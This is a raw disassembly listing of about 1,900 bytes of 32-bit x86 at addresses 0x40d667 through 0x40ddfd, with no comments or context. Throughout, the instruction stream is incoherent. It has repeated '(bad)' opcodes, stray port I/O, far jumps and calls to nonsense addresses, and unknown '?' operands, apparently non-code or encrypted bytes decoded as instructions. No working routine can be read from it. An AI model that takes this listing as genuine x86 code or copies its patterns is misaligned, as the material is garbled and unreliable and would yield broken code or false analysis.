  40d667:	clc    
  40d668:	lock push 0xffffffbc
  40d66b:	sub    esp,DWORD PTR [eax-0x5d70621b]
  40d671:	imul   esp,DWORD PTR [ebp+0x515920e8],0xffffffa9
  40d678:	xor    DWORD PTR [esi+0x61dc9a6],0x5d68802a
  40d682:	xor    esi,DWORD PTR [edx-0x2b]
  40d685:	aas    
  40d686:	jp     0x40d69a
  40d688:	jne    0x40d638
  40d68a:	enter  0x8de9,0x70
  40d68e:	or     al,0xd6
  40d690:	jl     0x40d6ad
  40d692:	push   esp
  40d693:	jnp    0x40d6d5
  40d695:	pusha  
  40d696:	(bad)  
  40d697:	in     al,dx
  40d698:	lahf   
  40d699:	xor    DWORD PTR es:[eax],ebx
  40d69c:	shl    ebp,0xe
  40d69f:	inc    ecx
  40d6a0:	outs   dx,DWORD PTR ds:[esi]
  40d6a1:	and    al,0x23
  40d6a3:	xchg   DWORD PTR [eax-0x553e9e5f],ebp
  40d6a9:	(bad)  
  40d6aa:	inc    ebx
  40d6ab:	aam    0xe7
  40d6ad:	adc    ecx,ebx
  40d6af:	inc    ebx
  40d6b0:	punpcklbw mm1,DWORD PTR [edx-0x72944206]
  40d6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b8:	ins    DWORD PTR es:[edi],dx
  40d6b9:	imul   esi,DWORD PTR [ebx],0x462c80b8
  40d6bf:	jbe    0x40d6e9
  40d6c1:	push   eax
  40d6c2:	cmp    eax,0xb2f71ef5
  40d6c7:	cmp    al,0xa7
  40d6c9:	inc    esp
  40d6ca:	dec    ebp
  40d6cb:	das    
  40d6cc:	ins    BYTE PTR es:[edi],dx
  40d6cd:	ret    
  40d6ce:	xor    al,BYTE PTR [edi-0x7055eef5]
  40d6d4:	sub    eax,ebx
  40d6d6:	ror    BYTE PTR [eax-0x43bd127a],cl
  40d6dc:	imul   eax,DWORD PTR [esi+0x8],0x42b601e3
  40d6e3:	push   edi
  40d6e4:	jne    0x40d6a0
  40d6e6:	cmp    bh,BYTE PTR [ebp+eiz*2-0x51aadcd2]
  40d6ed:	or     al,0x4e
  40d6ef:	jno    0x40d768
  40d6f1:	jb     0x40d6f7
  40d6f3:	lods   al,BYTE PTR ds:[esi]
  40d6f4:	shl    BYTE PTR [edi+ebp*4+0x4],0xfb
  40d6f9:	push   edi
  40d6fa:	adc    al,BYTE PTR [edi+esi*2]
  40d6fd:	xchg   esi,eax
  40d6fe:	jnp    0x40d689
  40d700:	loope  0x40d6a6
  40d702:	jae    0x40d721
  40d704:	clc    
  40d705:	sbb    cl,ah
  40d707:	fstp   QWORD PTR [edi]
  40d709:	push   ss
  40d70a:	sub    ecx,DWORD PTR ds:0xcc7ceb72
  40d710:	loope  0x40d769
  40d712:	addr16 ret 
  40d714:	or     ch,al
  40d716:	push   ecx
  40d717:	pop    esp
  40d718:	dec    edi
  40d719:	mov    al,ds:0x25d381e8
  40d71e:	test   eax,0xf3c0ce99
  40d723:	dec    ecx
  40d724:	dec    esi
  40d725:	ret    
  40d726:	jl     0x40d708
  40d728:	dec    esp
  40d729:	out    dx,eax
  40d72a:	push   cs
  40d72b:	lahf   
  40d72c:	mov    al,0x4b
  40d72e:	add    BYTE PTR [ebx-0x2d],dh
  40d731:	out    dx,al
  40d732:	dec    eax
  40d733:	int3   
  40d734:	dec    esp
  40d735:	add    al,0x20
  40d737:	mov    ds:0xb841d87a,al
  40d73c:	sub    ch,al
  40d73e:	push   ds
  40d73f:	inc    edx
  40d740:	push   es
  40d741:	inc    ebp
  40d742:	neg    BYTE PTR ds:0x24fc7b9e
  40d748:	adc    al,0x51
  40d74a:	lock push eax
  40d74c:	(bad)  
  40d74d:	push   esp
  40d74e:	and    BYTE PTR [esi+0x5b],0x7c
  40d752:	iret   
  40d753:	sbb    al,0x8b
  40d755:	and    DWORD PTR [edi-0x679fd965],esi
  40d75b:	repz and ebp,esp
  40d75e:	jge    0x40d726
  40d760:	mov    ds:0x4869fbed,eax
  40d765:	pop    ecx
  40d766:	xchg   esp,eax
  40d767:	and    cl,BYTE PTR [ecx]
  40d769:	mov    al,0x47
  40d76b:	ds pop ecx
  40d76d:	in     eax,0x6a
  40d76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d770:	ror    DWORD PTR [eax],cl
  40d772:	sbb    al,0x35
  40d775:	and    esi,DWORD PTR gs:[ecx-0xf]
  40d779:	mov    ebx,0x240636c5
  40d77e:	shl    DWORD PTR [edx-0x57521aae],cl
  40d784:	fcmovnbe st,st(4)
  40d786:	mov    ch,0xf0
  40d788:	arpl   ax,bx
  40d78a:	aad    0xd7
  40d78c:	cmp    BYTE PTR [edx+0x3bb592ec],ch
  40d792:	mov    esi,ecx
  40d794:	std    
  40d795:	das    
  40d796:	stc    
  40d797:	inc    edx
  40d798:	inc    ebx
  40d799:	push   0x19
  40d79b:	(bad)  
  40d79c:	mov    al,0xce
  40d79e:	inc    ebp
  40d79f:	loop   0x40d752
  40d7a1:	jecxz  0x40d802
  40d7a3:	inc    ebp
  40d7a4:	mov    dh,0x5e
  40d7a6:	cmp    eax,edx
  40d7a8:	push   0x86391c87
  40d7ad:	rcr    BYTE PTR [esi-0x1874004b],cl
  40d7b3:	test   DWORD PTR [esi+0x33dbba4],ebp
  40d7b9:	fldenv [eax]
  40d7bb:	jno    0x40d82a
  40d7bd:	pop    edx
  40d7be:	sahf   
  40d7bf:	(bad)  [ebx]
  40d7c1:	mov    al,0xc7
  40d7c3:	push   ecx
  40d7c4:	pop    eax
  40d7c5:	enter  0xf090,0x44
  40d7c9:	jmp    0x3c5fb4d7
  40d7ce:	stos   DWORD PTR es:[edi],eax
  40d7cf:	out    dx,eax
  40d7d0:	ja     0x40d76c
  40d7d2:	das    
  40d7d3:	in     al,0x35
  40d7d5:	jae    0x40d7b1
  40d7d7:	rcl    BYTE PTR [ebx+0x64],0x65
  40d7db:	lods   eax,DWORD PTR ds:[esi]
  40d7dc:	jae    0x40d82b
  40d7de:	aaa    
  40d7df:	nop
  40d7e0:	fwait
  40d7e1:	js     0x40d819
  40d7e3:	pop    ss
  40d7e4:	cwde   
  40d7e5:	popa   
  40d7e6:	(bad)  [eax+0x76]
  40d7e9:	pop    eax
  40d7ea:	mov    bh,0x69
  40d7ec:	out    0x76,al
  40d7ee:	sub    eax,ebp
  40d7f0:	and    ebx,ebx
  40d7f2:	cmp    dh,bh
  40d7f4:	sub    DWORD PTR [esp+ebp*4-0x329b175],esp
  40d7fb:	cwde   
  40d7fc:	js     0x40d878
  40d7fe:	jp     0x40d82f
  40d800:	mov    edi,0x4c308f9a
  40d805:	sar    BYTE PTR [edx],cl
  40d807:	mov    edx,0xa9126b1b
  40d80c:	scas   eax,DWORD PTR es:[edi]
  40d80d:	nop
  40d80e:	mov    dl,0x5e
  40d810:	(bad)  
  40d811:	dec    esp
  40d812:	xchg   edx,eax
  40d813:	loope  0x40d857
  40d815:	aaa    
  40d816:	scas   eax,DWORD PTR es:[edi]
  40d817:	dec    esp
  40d818:	out    0x62,eax
  40d81a:	sbb    dl,ah
  40d81c:	xor    dl,BYTE PTR [eax]
  40d81e:	mov    ds:0xe7b46de7,al
  40d823:	outs   dx,DWORD PTR ds:[esi]
  40d824:	fisttp QWORD PTR [edi-0x3cd9b33b]
  40d82a:	aas    
  40d82b:	(bad)  
  40d82c:	push   cs
  40d82d:	mov    al,ds:0x10486e92
  40d832:	dec    edi
  40d833:	mov    dl,BYTE PTR [ebp+0x7557dee7]
  40d839:	adc    dl,BYTE PTR [ecx]
  40d83b:	xor    edi,DWORD PTR es:[edi]
  40d83e:	cmp    esi,DWORD PTR ss:[ebx-0x39942d05]
  40d845:	mov    eax,0xebf80440
  40d84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d84b:	cwde   
  40d84c:	mov    edx,0x80377a0e
  40d851:	ffreep st(4)
  40d853:	retf   
  40d854:	sbb    edi,DWORD PTR [esi+0xe]
  40d857:	fs pusha 
  40d859:	xchg   DWORD PTR [edx+0x7f688535],esp
  40d85f:	shl    DWORD PTR [ebp-0x3efbae5b],cl
  40d865:	div    DWORD PTR [esp+edi*8]
  40d868:	xor    eax,0xa5ed7743
  40d86d:	fbstp  TBYTE PTR [esi+0x16]
  40d870:	retf   0x5426
  40d873:	pushw  ss
  40d875:	imul   ebx,DWORD PTR [ecx+0x43],0xe
  40d879:	fidiv  WORD PTR gs:[edi+0x41c3aab1]
  40d880:	cmp    BYTE PTR [ebx-0x22],ah
  40d883:	jbe    0x40d839
  40d885:	pop    ds
  40d886:	stc    
  40d887:	shr    DWORD PTR [esi-0x3ac2cf5b],1
  40d88d:	sub    dl,BYTE PTR [ebp-0x12a8141]
  40d893:	pop    esi
  40d894:	mov    cl,0xf2
  40d896:	xchg   ebx,eax
  40d897:	daa    
  40d898:	inc    esi
  40d899:	jmp    0xacb7b64c
  40d89e:	jne    0x40d84d
  40d8a0:	push   es
  40d8a1:	pop    ds
  40d8a2:	jle    0x40d91f
  40d8a4:	mov    ds:0x9ce4cff6,al
  40d8a9:	repz popa 
  40d8ab:	stc    
  40d8ac:	addr16 xchg ebx,eax
  40d8ae:	arpl   WORD PTR [edx-0x44f45e86],cx
  40d8b4:	dec    ebx
  40d8b5:	and    eax,0x18c93812
  40d8ba:	and    DWORD PTR [eax-0x3159f755],0xffffff8e
  40d8c1:	dec    edx
  40d8c2:	es push es
  40d8c4:	and    DWORD PTR [esi+edx*2-0x548c9c94],ebx
  40d8cb:	test   al,0x91
  40d8cd:	xor    al,0xba
  40d8cf:	mov    eax,0xf486780e
  40d8d4:	add    esp,DWORD PTR [ebx+0x288de10a]
  40d8da:	std    
  40d8db:	jae    0x40d8a3
  40d8dd:	test   BYTE PTR [esi+eax*8-0x64dc96c6],dh
  40d8e4:	nop
  40d8e5:	lock jb 0x40d940
  40d8e8:	pop    ebp
  40d8e9:	inc    ebp
  40d8ea:	cmp    al,0x8
  40d8ec:	xor    eax,0xdbbfab25
  40d8f1:	ja     0x40d924
  40d8f3:	xor    ecx,DWORD PTR [ecx+eax*4-0x6]
  40d8f7:	cmp    ebp,DWORD PTR [ecx-0x73b0e47d]
  40d8fd:	lods   eax,DWORD PTR ds:[esi]
  40d8fe:	ins    DWORD PTR es:[edi],dx
  40d8ff:	mov    WORD PTR [eax-0x68],?
  40d902:	(bad)  
  40d904:	fcom   QWORD PTR [ecx-0x5b]
  40d907:	inc    ecx
  40d908:	adc    DWORD PTR [ebp-0x6e280d4b],0x661eceeb
  40d912:	fidiv  DWORD PTR [bx+si+0x4cf5]
  40d917:	dec    edi
  40d918:	jle    0xcb9703e7
  40d91e:	aad    0x2b
  40d920:	(bad)  
  40d922:	out    dx,al
  40d923:	gs mov al,ch
  40d926:	(bad)  
  40d928:	in     eax,dx
  40d929:	or     eax,0x62503da5
  40d92e:	adc    al,0x25
  40d930:	lea    ecx,[edi-0x70]
  40d933:	sub    al,0x35
  40d935:	mov    al,0x84
  40d937:	cmp    BYTE PTR [edi+0x4d314676],dh
  40d93d:	fsubr  DWORD PTR [ecx+0x31]
  40d940:	shl    BYTE PTR [edx+0x46],1
  40d943:	push   ds
  40d944:	fdivr  QWORD PTR [ecx]
  40d946:	aam    0x9b
  40d948:	dec    eax
  40d949:	adc    eax,0x7ae092d3
  40d94e:	and    BYTE PTR [ecx],dl
  40d950:	push   eax
  40d951:	pop    ebp
  40d952:	pusha  
  40d953:	fiadd  WORD PTR [edx]
  40d955:	lods   eax,DWORD PTR ds:[esi]
  40d956:	jmp    0x2d00:0x6fc5397b
  40d95d:	shl    ebp,cl
  40d95f:	in     eax,dx
  40d960:	cld    
  40d961:	fcomp  DWORD PTR [edi-0x17]
  40d964:	jb     0x40d914
  40d966:	sbb    dh,dl
  40d968:	clc    
  40d969:	dec    ecx
  40d96a:	pop    eax
  40d96b:	mov    ecx,0xfa8c97b5
  40d970:	fs push ebx
  40d972:	mov    BYTE PTR [ecx],dl
  40d974:	pop    ss
  40d975:	mov    cl,0x41
  40d977:	xor    edx,0xee38e2d2
  40d97d:	adc    BYTE PTR [esi],0xb0
  40d980:	test   ebp,eax
  40d982:	mov    DWORD PTR [esi],esp
  40d984:	jecxz  0x40d909
  40d986:	push   ebx
  40d987:	sub    DWORD PTR [edx],edi
  40d989:	data16 mov cl,dh
  40d98c:	rcl    esi,1
  40d98e:	scas   al,BYTE PTR es:[edi]
  40d98f:	cmp    esp,DWORD PTR ds:0x7a8ff66a
  40d995:	pop    esi
  40d996:	push   es
  40d997:	sbb    DWORD PTR [ebp+0x4c01b3a7],ebx
  40d99d:	not    dl
  40d99f:	mov    cl,0x9f
  40d9a1:	push   0xffffff88
  40d9a3:	push   edx
  40d9a4:	sub    BYTE PTR [ebx+0x5e],bl
  40d9a7:	mov    eax,ds:0x6dbccebb
  40d9ac:	neg    DWORD PTR [esi+0x4f]
  40d9af:	test   BYTE PTR [edi+0x5],bh
  40d9b2:	sbb    BYTE PTR [ebx+ebx*4],dh
  40d9b5:	xor    BYTE PTR [ebx],dl
  40d9b7:	mov    ch,0xc2
  40d9b9:	mov    BYTE PTR [ebx+0x72f84a8d],dh
  40d9bf:	ja     0x40d997
  40d9c1:	add    al,dh
  40d9c3:	xchg   ebp,eax
  40d9c4:	shr    DWORD PTR [edx-0x65e7ddae],0x1e
  40d9cb:	leave  
  40d9cc:	les    esi,FWORD PTR [esi]
  40d9ce:	or     ebp,DWORD PTR [edi]
  40d9d0:	sahf   
  40d9d1:	jmp    0x40da10
  40d9d3:	test   DWORD PTR [ecx],edx
  40d9d5:	mov    al,0xba
  40d9d7:	inc    esp
  40d9d8:	xchg   esi,eax
  40d9d9:	ror    BYTE PTR [edi],1
  40d9db:	sti    
  40d9dc:	xor    edx,esp
  40d9de:	push   0x691d94ad
  40d9e3:	test   BYTE PTR [edi-0x75],ah
  40d9e6:	dec    ecx
  40d9e7:	push   ecx
  40d9e8:	vmovhpd xmm0,xmm6,xmm0
  40d9ec:	adc    BYTE PTR [ebp-0xd],0x5c
  40d9f0:	cmp    BYTE PTR [esi-0x63579414],dh
  40d9f6:	aad    0x7
  40d9f8:	out    0x6e,eax
  40d9fa:	jno    0x40d99b
  40d9fc:	pushf  
  40d9fd:	arpl   WORD PTR [ebx-0x5fd49d44],di
  40da03:	out    0xa,eax
  40da05:	sub    al,0x66
  40da07:	repnz mov ah,0x19
  40da0a:	sbb    BYTE PTR [ecx],dh
  40da0c:	mov    ds:0x97f98fb1,al
  40da11:	push   0xa238f83f
  40da16:	popa   
  40da17:	(bad)  
  40da18:	jmp    0x1603:0xa6c4ab39
  40da1f:	ins    DWORD PTR es:[edi],dx
  40da20:	dec    edi
  40da21:	xor    DWORD PTR [edi+edi*1-0x31b95960],edx
  40da28:	pop    edi
  40da29:	jl     0x40da22
  40da2b:	adc    al,0x56
  40da2d:	loope  0x40da64
  40da2f:	pop    ss
  40da30:	push   ecx
  40da31:	sbb    ebp,DWORD PTR [ebx-0x7314d315]
  40da37:	cmp    cl,BYTE PTR [eax]
  40da39:	jle    0x40da9c
  40da3b:	add    ecx,DWORD PTR [esi]
  40da3d:	fld    TBYTE PTR [ebp+0x45]
  40da40:	repnz mov cl,BYTE PTR [esi]
  40da43:	enter  0xe9eb,0x9e
  40da47:	mov    ecx,0x7877b880
  40da4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da4d:	and    ecx,DWORD PTR [edi]
  40da4f:	jmp    0x40d9ee
  40da51:	mov    ecx,edi
  40da53:	pop    esp
  40da54:	arpl   WORD PTR [ebx+0x7e],ax
  40da57:	mov    cl,0x2a
  40da59:	data16 icebp 
  40da5b:	and    al,0x8d
  40da5d:	loope  0x40da9d
  40da5f:	lock mov ebp,0x3bdb8b58
  40da65:	xchg   ebp,esi
  40da67:	cmc    
  40da68:	adc    al,0xbc
  40da6a:	add    eax,0x18c3b5c
  40da6f:	cld    
  40da70:	(bad)  [ecx-0x6ed85d17]
  40da76:	retf   
  40da77:	in     eax,0xa7
  40da79:	add    DWORD PTR [esi-0x783b2a75],esi
  40da7f:	cmp    edx,edx
  40da81:	lods   eax,DWORD PTR ds:[esi]
  40da82:	daa    
  40da83:	or     bl,BYTE PTR [ebp-0x515506c7]
  40da89:	stos   DWORD PTR es:[edi],eax
  40da8a:	stos   DWORD PTR es:[edi],eax
  40da8b:	dec    eax
  40da8c:	cli    
  40da8d:	ja     0x535b6fbe
  40da93:	cmp    DWORD PTR [edx-0x51bd463e],edi
  40da99:	cld    
  40da9a:	mov    eax,ds:0x8df858d8
  40da9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daa0:	push   cs
  40daa1:	and    al,0x27
  40daa3:	mov    ecx,DWORD PTR [ebp+0x13]
  40daa6:	mov    dh,BYTE PTR [ecx-0x22]
  40daa9:	adc    eax,0xb09b195d
  40daae:	(bad)  
  40daaf:	cs xchg al,ah
  40dab2:	cmp    eax,0x6c02165a
  40dab8:	adc    BYTE PTR [edx-0x19],0xbe
  40dabc:	(bad)  
  40dabd:	mov    dl,0xb4
  40dabf:	mov    esp,0x8922caf6
  40dac4:	fcmovnb st,st(3)
  40dac6:	push   ss
  40dac7:	mov    ah,bh
  40dac9:	lods   eax,DWORD PTR ds:[esi]
  40daca:	test   al,0x4e
  40dacc:	cdq    
  40dacd:	test   BYTE PTR [ebx+0xc737335],cl
  40dad3:	pop    ss
  40dad4:	push   es
  40dad5:	in     al,0x56
  40dad7:	pop    ebp
  40dad8:	ror    BYTE PTR [edi],1
  40dada:	mov    al,ds:0x1411e5ea
  40dadf:	neg    BYTE PTR [ecx+eiz*4+0x27]
  40dae3:	scas   al,BYTE PTR es:[edi]
  40dae4:	pushf  
  40dae5:	jns    0x40db30
  40dae7:	or     ah,BYTE PTR [ecx-0x7f]
  40daea:	mov    eax,0x1b11cf93
  40daef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf0:	adc    al,0xe5
  40daf2:	retf   
  40daf3:	and    al,0xd9
  40daf5:	pop    edi
  40daf6:	int    0x6a
  40daf8:	out    0x77,eax
  40dafa:	sub    al,0x57
  40dafc:	and    BYTE PTR [esi],bl
  40dafe:	addr16 pop ds
  40db00:	push   0x7b
  40db02:	call   0x3bd2:0xa9e102e3
  40db09:	loope  0x40dac8
  40db0b:	jne    0x40daf8
  40db0d:	mov    al,0x1f
  40db0f:	add    dh,al
  40db11:	jmp    0x41b56d86
  40db16:	jnp    0x40db02
  40db18:	call   0x1bcfa9a3
  40db1d:	ds aaa 
  40db1f:	push   edx
  40db20:	mov    esi,0x7ad29d18
  40db25:	sub    BYTE PTR [edi],ah
  40db27:	call   0x56667b60
  40db2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db2d:	mov    es,eax
  40db2f:	(bad)  
  40db30:	nop
  40db31:	je     0x40db9d
  40db33:	mov    eax,0x51facb24
  40db38:	mov    ds:0xbc2e8d9c,al
  40db3d:	les    edi,FWORD PTR [eax-0x69]
  40db40:	sub    ecx,ebx
  40db42:	cs cs add eax,0xe9c9a5e1
  40db49:	ja     0x40dadb
  40db4b:	pop    ebp
  40db4c:	hlt    
  40db4d:	dec    DWORD PTR [esp+eiz*4+0x2ef614d3]
  40db54:	loop   0x40dbc9
  40db56:	sbb    bh,BYTE PTR [edi]
  40db58:	imul   ebx,DWORD PTR [edx],0xaee9b6d2
  40db5e:	jb     0x40db06
  40db60:	mov    al,ds:0x2a6eb98a
  40db65:	test   eax,0x3633e667
  40db6a:	sahf   
  40db6b:	sub    BYTE PTR [ecx+0x66],ch
  40db6e:	addr16 (bad) 
  40db70:	ds push edi
  40db72:	cmp    al,0x89
  40db74:	dec    ecx
  40db75:	cmc    
  40db76:	je     0x40dbe2
  40db78:	jmp    0x40db20
  40db7a:	mov    ds:0xa553e0d0,eax
  40db7f:	mov    ah,0x0
  40db81:	sbb    DWORD PTR [edx-0x2e20b2bf],ebx
  40db87:	sbb    eax,0xfc38a73a
  40db8c:	loope  0x40db34
  40db8e:	(bad)  
  40db8f:	mov    esp,0x9ee099c5
  40db94:	ins    DWORD PTR es:[edi],dx
  40db95:	push   edx
  40db96:	aas    
  40db97:	imul   ebp,DWORD PTR [edx+eiz*4+0x7021a032],0x82d480f9
  40dba2:	jmp    0x422ab1df
  40dba7:	jle    0x40db63
  40dba9:	(bad)  
  40dbaa:	test   eax,0x6a7dda23
  40dbaf:	dec    esi
  40dbb0:	shl    ebx,cl
  40dbb2:	inc    ecx
  40dbb3:	arpl   WORD PTR [ecx+0x17b70402],dx
  40dbb9:	enter  0xc1ec,0xc2
  40dbbd:	stc    
  40dbbe:	cli    
  40dbbf:	cli    
  40dbc0:	retf   0xa5af
  40dbc3:	add    bl,bl
  40dbc5:	dec    edi
  40dbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbc7:	push   0xd759f064
  40dbcc:	inc    ebp
  40dbcd:	dec    esi
  40dbce:	adc    al,0x51
  40dbd0:	xor    DWORD PTR [edi],esp
  40dbd2:	mov    ch,bl
  40dbd4:	loop   0x40dbf1
  40dbd6:	jns    0x40db7a
  40dbd8:	mov    cl,BYTE PTR [edx-0x7f0ec7ce]
  40dbde:	and    eax,0x5691a0b0
  40dbe3:	(bad)  
  40dbe4:	in     eax,dx
  40dbe5:	dec    ebp
  40dbe6:	mov    DWORD PTR [edx+edi*4-0x78],esp
  40dbea:	imul   esp,DWORD PTR [ebx],0x58
  40dbed:	mov    bh,0x46
  40dbef:	inc    esp
  40dbf0:	vmwrite eax,DWORD PTR [esi]
  40dbf3:	in     al,0x68
  40dbf5:	call   0xd983:0x57b8006c
  40dbfc:	jp     0x40db97
  40dbfe:	mov    al,ds:0xd4a3c69f
  40dc03:	or     al,0xfe
  40dc05:	test   DWORD PTR [ebx-0x24],0xc818382e
  40dc0c:	int3   
  40dc0d:	inc    ebp
  40dc0e:	jmp    0x1bc5ae0e
  40dc13:	mov    dl,0xa0
  40dc15:	push   ecx
  40dc16:	mov    esi,0xbb57dbca
  40dc1b:	rol    BYTE PTR [esi-0x71],0xe3
  40dc1f:	sbb    eax,0xf33d342f
  40dc24:	or     eax,edi
  40dc26:	or     al,0xeb
  40dc28:	jno    0x40dc55
  40dc2a:	rcl    DWORD PTR [edx+edx*1],cl
  40dc2d:	ja     0x40dc2f
  40dc2f:	iret   
  40dc30:	xchg   edi,eax
  40dc31:	mov    ebp,0xaa23b199
  40dc36:	repnz pop ebx
  40dc38:	fist   DWORD PTR [ebp+0x3dd7ff62]
  40dc3e:	mov    ecx,0x4c1a9e67
  40dc43:	out    0xe9,eax
  40dc45:	mov    cl,0xd6
  40dc47:	mov    bh,0x32
  40dc49:	mov    WORD PTR [ecx-0x76],es
  40dc4c:	out    dx,al
  40dc4d:	loop   0x40dc29
  40dc4f:	pop    esi
  40dc50:	pop    esi
  40dc51:	sahf   
  40dc52:	pushf  
  40dc53:	popf   
  40dc54:	dec    edx
  40dc55:	push   edi
  40dc56:	xchg   ecx,eax
  40dc57:	icebp  
  40dc58:	jle    0x40dcc2
  40dc5a:	test   BYTE PTR ds:0x996ce0e2,0x43
  40dc61:	or     ecx,eax
  40dc63:	mov    ?,WORD PTR [ebx+0x70]
  40dc66:	ins    BYTE PTR es:[edi],dx
  40dc67:	xor    dh,BYTE PTR [edi-0x2a]
  40dc6a:	adc    eax,0xe2465d38
  40dc6f:	fcomp  QWORD PTR [edx]
  40dc71:	mov    eax,DWORD PTR [edx+0x636fccb5]
  40dc77:	ds pop edx
  40dc79:	xchg   ecx,eax
  40dc7a:	adc    ebx,DWORD PTR [ecx-0x4c]
  40dc7d:	fdivr  DWORD PTR [eax+edx*1+0x7e]
  40dc81:	mov    esi,0x39c8c9b7
  40dc86:	add    al,BYTE PTR [ebx-0x5723de4e]
  40dc8c:	lea    esi,[ebx-0x7b]
  40dc8f:	jbe    0x40dc32
  40dc91:	push   edi
  40dc92:	enter  0xc1d0,0x96
  40dc96:	popf   
  40dc97:	cwde   
  40dc98:	jbe    0x40dd03
  40dc9a:	rcr    DWORD PTR [ecx],cl
  40dc9c:	test   al,0x35
  40dc9e:	xchg   esp,eax
  40dc9f:	inc    esi
  40dca0:	ret    
  40dca1:	pop    ebx
  40dca2:	loopne 0x40dc88
  40dca4:	ror    cl,1
  40dca6:	add    eax,esi
  40dca8:	dec    esi
  40dca9:	lods   ax,WORD PTR ds:[si]
  40dcac:	out    dx,eax
  40dcad:	and    al,0x43
  40dcaf:	inc    DWORD PTR [esi+0x17]
  40dcb2:	pop    ebx
  40dcb3:	sbb    eax,0x3d42bc32
  40dcb8:	xchg   ecx,eax
  40dcb9:	lea    esp,[ebx+0x2]
  40dcbc:	test   BYTE PTR [ebp-0x63f8b229],cl
  40dcc2:	adc    al,0x8e
  40dcc4:	fist   DWORD PTR [edi-0x58]
  40dcc7:	clc    
  40dcc8:	test   BYTE PTR [eax+ebp*1+0x56b96f5],cl
  40dccf:	and    BYTE PTR [ebp-0x53fac1b1],0x4b
  40dcd6:	idiv   DWORD PTR [ebp+0x3a45a96d]
  40dcdc:	pop    ecx
  40dcdd:	daa    
  40dcde:	push   es
  40dcdf:	xor    ebx,DWORD PTR [ecx]
  40dce1:	cmp    esi,DWORD PTR [eax+ebx*4]
  40dce4:	adc    eax,0x60ec7a9d
  40dce9:	(bad)  
  40dcea:	cs sub al,0xbe
  40dced:	mov    eax,0xf2b966b9
  40dcf2:	fsubr  QWORD PTR [edi+0x67eaddf8]
  40dcf8:	icebp  
  40dcf9:	outs   dx,DWORD PTR ds:[esi]
  40dcfa:	outs   dx,DWORD PTR ds:[esi]
  40dcfb:	mov    ss,eax
  40dcfd:	clc    
  40dcfe:	aad    0x25
  40dd00:	shl    eax,1
  40dd02:	lods   eax,DWORD PTR ds:[esi]
  40dd03:	xor    al,0xfc
  40dd05:	in     al,dx
  40dd06:	fwait
  40dd07:	add    BYTE PTR [edi-0x813e57f],dh
  40dd0d:	or     esp,DWORD PTR [ebx+0x77bc93d9]
  40dd13:	mov    edx,0xb997e732
  40dd18:	repz dec edi
  40dd1a:	pop    eax
  40dd1b:	iret   
  40dd1c:	aas    
  40dd1d:	or     ch,dl
  40dd1f:	or     al,0xcf
  40dd21:	loope  0x40dd3b
  40dd23:	push   ebp
  40dd24:	and    al,0xe2
  40dd26:	push   ss
  40dd27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd28:	sub    bh,bl
  40dd2a:	outs   dx,BYTE PTR ds:[esi]
  40dd2b:	mov    DWORD PTR [edx+ebp*4-0x98193eb],edx
  40dd32:	(bad)  
  40dd33:	out    0x53,eax
  40dd35:	xor    eax,0x969c9ed7
  40dd3a:	dec    esi
  40dd3b:	cli    
  40dd3c:	cmp    eax,DWORD PTR [edx+0x46]
  40dd3f:	(bad)  
  40dd41:	(bad)  
  40dd42:	push   esi
  40dd43:	adc    BYTE PTR [edx+0x610d199],0xf5
  40dd4a:	push   cs
  40dd4b:	enter  0xbaae,0x71
  40dd4f:	cmp    DWORD PTR [edx+0x5cdaef42],eax
  40dd55:	addr16 clc 
  40dd57:	outs   dx,DWORD PTR ds:[esi]
  40dd58:	and    bl,BYTE PTR [bp+di]
  40dd5b:	jnp    0x40dd9a
  40dd5d:	enter  0xf8e5,0x10
  40dd61:	and    dl,BYTE PTR [eax]
  40dd63:	jmp    0x396e39bb
  40dd68:	inc    ebx
  40dd69:	mov    ds:0x901471c8,al
  40dd6e:	xchg   esi,eax
  40dd6f:	aas    
  40dd70:	lods   al,BYTE PTR ds:[esi]
  40dd71:	cmp    ebx,DWORD PTR [edx-0x1f6ebc49]
  40dd77:	pop    esp
  40dd78:	push   0x64
  40dd7a:	xchg   ch,ah
  40dd7c:	xor    ecx,ebx
  40dd7e:	mov    eax,ds:0xb2638255
  40dd83:	std    
  40dd84:	lea    eax,[edx-0x35286e2d]
  40dd8a:	mov    edi,0xec7e1b8d
  40dd8f:	aam    0x75
  40dd91:	sbb    al,0xd9
  40dd93:	and    BYTE PTR [edi-0x3a],0xca
  40dd97:	sahf   
  40dd98:	ss inc bp
  40dd9b:	sub    eax,0x35e5ce9c
  40dda0:	sbb    dl,BYTE PTR ds:0x2d854b15
  40dda6:	jno    0x40dd4e
  40dda8:	scas   al,BYTE PTR es:[edi]
  40dda9:	pop    ecx
  40ddaa:	or     eax,0x26eecf2d
  40ddaf:	jle    0x40ddad
  40ddb1:	adc    al,0x87
  40ddb3:	ficomp WORD PTR ds:[ebx-0x3bafa835]
  40ddba:	int    0xb1
  40ddbc:	adc    eax,0xe3b394f1
  40ddc1:	in     al,0xaf
  40ddc3:	into   
  40ddc4:	hlt    
  40ddc5:	xchg   esi,eax
  40ddc6:	in     eax,0xa2
  40ddc8:	sub    BYTE PTR cs:[edx-0x8c98f8c],cl
  40ddcf:	call   0xd12d5ddc
  40ddd4:	pop    esp
  40ddd5:	mov    ecx,0xb1e1c68b
  40ddda:	arpl   ax,dx
  40dddc:	lahf   
  40dddd:	push   ecx
  40ddde:	or     cl,BYTE PTR [edx-0x72c686a3]
  40dde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde5:	cdq    
  40dde6:	fld    st(6)
  40dde8:	icebp  
  40dde9:	(bad)  
  40ddea:	xlat   BYTE PTR ds:[ebx]
  40ddeb:	mov    dl,0x39
  40dded:	mov    ch,0xcb
  40ddef:	leave  
  40ddf0:	xchg   esp,eax
  40ddf1:	lock js 0x40de24
  40ddf4:	dec    edi
  40ddf5:	lods   al,BYTE PTR ds:[esi]
  40ddf6:	sub    esi,esp
  40ddf8:	sbb    DWORD PTR [ebx],esi
  40ddfa:	xor    DWORD PTR [ecx+0x52],ebp
  40ddfd:	adc    al,0xcf
